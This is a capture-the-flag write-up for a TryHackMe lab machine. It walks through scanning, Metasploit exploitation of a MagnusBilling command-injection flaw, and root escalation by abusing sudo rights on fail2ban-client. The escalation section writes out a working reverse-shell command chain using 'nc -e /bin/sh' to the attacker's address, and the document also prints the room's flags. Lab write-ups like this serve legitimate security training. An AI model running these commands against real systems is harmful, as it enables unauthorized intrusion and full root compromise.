@@ -1,0 +1,221 @@
+Billing
+A THM Room
+By Sovren
+
+Gain a shell, find the way and escalate your privileges!
+
+Note: Bruteforcing is out of scope for this room.
+
+
+=============:\\\\\\\\
+RECONAISSANCE:-------->>
+=============:////////
+-The site is called MagnusBilling and has a login form.
+--POST goes to filename:  /mbilling/index.php/authentication/login
+---Response is:  "success":false,"msg":"Username and password combination is invalid"
+----it's unlikely that we will use this information as Bruteforcing has already been mentioned
+to be out of the scope of the room, but it is being noted down for best practice purposes.
+
+-I tried the credentials admin:admin on the logon page and the machine appears to have crashed.
+--After three unsuccessful attempts, the machine appears to become unresponsive. This was later discovered to be fail2ban at work, which we successfuly exploited later on.
+
+The NMAP scan revealed port 5038 to be open with something called Asterix Call Manager 2.10.6:
+Viewing the site reveals:
+.........................
+Asterisk Call Manager/2.10.6
+Response: Error
+Message: Missing action in request
+..................................
+
+-The site also uses something called MagnusBilling, a free billing opensource to Asterisk
+
+
+=============:\\\\\\\\\\
+ENUMERATION:------------->>
+=============://////////
+NMAP
+====
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
+| ssh-hostkey:
+|   256 a1:5f:39:59:79:e4:e7:ef:c7:fd:16:01:64:34:ab:0f (ECDSA)
+|_  256 40:59:60:c2:ab:4f:01:4f:6c:7c:f5:f8:94:93:8a:ca (ED25519)
+80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/mbilling/
+| http-title:             MagnusBilling
+|_Requested resource was http://10.82.133.94/mbilling/
+5038/tcp open  asterisk Asterisk Call Manager 2.10.6
+Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (94%), Linux 5.4 (94%), Adtran 424RG FTTH gateway (92%), Android 10 - 11 (Linux 4.14) (92%), Linux 2.6.32 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%), Linux 4.12 (92%), Linux 4.14 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 3 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+GOBUSTER
+========
+# gobuster dir -u http://10.82.133.94 -w /usr/share/wordlists/dirb/common.txt
+----------------------------------------------
+.htaccess            (Status: 403) [Size: 277]
+.hta                 (Status: 403) [Size: 277]
+.htpasswd            (Status: 403) [Size: 277]
+akeeba.backend.log   (Status: 403) [Size: 277]
+development.log      (Status: 403) [Size: 277]
+index.php            (Status: 302) [Size: 1] [--> ./mbilling]
+production.log       (Status: 403) [Size: 277]
+robots.txt           (Status: 200) [Size: 37]
+server-status        (Status: 403) [Size: 277]
+spamlog.log          (Status: 403) [Size: 277]
+----------------------------------------------
+robots.txt
+..........
+User-agent: *
+Disallow: /mbilling/
+....................
+
+
+-the /mbilling dir is disallowed by robots.txt and is referenced in the source code.
+# gobuster dir -u http://10.82.133.94/mbilling -w /usr/share/wordlists/dirb/common.txt
+----------------------------------------------
+.hta                 (Status: 403) [Size: 277]
+.htaccess            (Status: 403) [Size: 277]
+akeeba.backend.log   (Status: 403) [Size: 277]
+archive              (Status: 301) [Size: 323] [--> http://10.82.133.94/mbilling/archive/]
+.htpasswd            (Status: 403) [Size: 277]
+assets               (Status: 301) [Size: 322] [--> http://10.82.133.94/mbilling/assets/]
+development.log      (Status: 403) [Size: 277]
+fpdf                 (Status: 301) [Size: 320] [--> http://10.82.133.94/mbilling/fpdf/]
+index.html           (Status: 200) [Size: 30760]
+index.php            (Status: 200) [Size: 663]
+lib                  (Status: 301) [Size: 319] [--> http://10.82.133.94/mbilling/lib/]
+LICENSE              (Status: 200) [Size: 7652]
+production.log       (Status: 403) [Size: 277]
+protected            (Status: 403) [Size: 277]
+resources            (Status: 301) [Size: 325] [--> http://10.82.133.94/mbilling/resources/]
+spamlog.log          (Status: 403) [Size: 277]
+tmp                  (Status: 301) [Size: 319] [--> http://10.82.133.94/mbilling/tmp/]
+----------------------------------------------
+List of directories we can view from the above:
+/archive
+/assets
+/fpdf
+/index.html
+/index.php  -  provides us with some code. Potential exploit here.
+/lib
+/resources  -  no data displayed
+
+
+
+=============:\\\\\\\\\\\\
+EXPLOITATION:--------------->>
+=============:////////////
+# msfconsole
+# search magnus billing
+
+- MagnusBilling application unauthenticated Remote Command Execution.
+
+Overview
+
+The MagnusBilling unauthenticated Remote Command Execution (RCE) exploited by Metasploit (CVE-2023-30258) is caused by insufficient input validation combined with unsafe command execution in a PHP backend endpoint. The vulnerability allows unauthenticated attackers to inject and execute arbitrary system commands on the server.
+
+Metasploit automates this process, but the underlying flaw is a command injection vulnerability in a web-exposed PHP script.
+
+--Options were configured and the exploit was executed successfully.
+
+msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
+[*] Started reverse TCP handler on 192.168.135.113:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Checking if 10.81.188.109:80 can be exploited.
+[*] Performing command injection test issuing a sleep command of 6 seconds.
+[*] Elapsed time: 6.14 seconds.
+[+] The target is vulnerable. Successfully tested command injection.
+[*] Executing PHP for php/meterpreter/reverse_tcp
+[*] Sending stage (42137 bytes) to 10.81.188.109
+[+] Deleted oTHjWxTKrWWGLL.php
+[*] Meterpreter session 1 opened (192.168.135.113:4444 -> 10.81.188.109:50596) at 2026-02-10 18:45:22 +0000
+
+-We then stabilised our shell
+# shell
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+# export TERM=xterm
+
+-A user was found called magnus with a user.txt file containing the first flag in their /home directory.
+THM{4a6831d5f124b25eefb1e92e0f0da4ca}
+
+-Now we move on to escalating our privileges to find the root flag.
+
+
+====================:\\\\\\\
+PRIVILEGE ESCALATION:-------->>>
+====================:///////
+
+# cat /proc/version
+Linux version 6.1.0-37-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22)
+
+# uname -a
+Linux ip-10-81-188-109 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64 GNU/Linux
+
+# sudo -l
+Matching Defaults entries for asterisk on ip-10-81-188-109:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for asterisk:
+    Defaults!/usr/bin/fail2ban-client !requiretty
+
+User asterisk may run the following commands on ip-10-81-188-109:
+    (ALL) NOPASSWD: /usr/bin/fail2ban-client
+
+# find / -perm -4000 2>/dev/null
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/bin/fusermount3
+/usr/bin/ntfs-3g
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/lib/openssh/ssh-keysign
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+
+# cat /etc/crontab
+-no scheduled tasks other than the defaults
+
+---fail2ban is our obvious choice here.
+----Important Note: This is why bruteforcing is not within the scope of this room. It was Fail2Ban that was causing the machine to crash when we tried to guess credentials.
+
+-----Here's something I found online and then adapted that works really well.
+
+#1 sudo /usr/bin/fail2ban-client restart
+#2 sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "nc -e /bin/sh 192.168.135.113 1234"
+#3 nc -lvnp 1234 (from your own machine)
+#4 sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
+
+The original only sent a copy of the root.txt file to the /tmp folder and concatenated it. This is great if you know the name of a file you're looking for, but that won't always be the case.
+
+With this one, we sent out a reverse shell which we could catch with our listener and which gave us root access to the machine.
+
+With root access achieved, we can go into the root folder and cat the fil to reveal the flag.
+
+THM{33ad5b530e71a172648f424ec23fae60}
+
+
+=============:\\\\\\\\\\\\\\\\\\\\\
+REPORTING:-------------------------->>
+=============://///////////////////
+The target system was found to be vulnerable to multiple high-risk security issues that ultimately allowed unauthenticated remote code execution and full root compromise. Initial reconnaissance identified a publicly accessible MagnusBilling web application and an exposed Asterisk Call Manager service. Enumeration confirmed the application was outdated and revealed several accessible directories containing application logic.
+
+Exploitation was achieved through a known unauthenticated remote command execution vulnerability in MagnusBilling (CVE-2023-30258), allowing an attacker to gain an initial shell on the system without valid credentials. Post-exploitation activities confirmed access to a low-privileged user account and validated the impact of the vulnerability.
+
+Privilege escalation was made possible due to a dangerous sudo misconfiguration, which permitted the asterisk user to execute the fail2ban-client binary with NOPASSWD privileges. This configuration allowed arbitrary command execution as root by modifying Fail2Ban actions. By abusing this functionality, a reverse shell was executed with root privileges, resulting in complete system compromise.
+
+Overall, the combination of an exposed vulnerable web application and improper privilege controls led to a critical security failure. An external attacker could fully compromise the system without authentication, resulting in total loss of confidentiality, integrity, and availability.
+
+
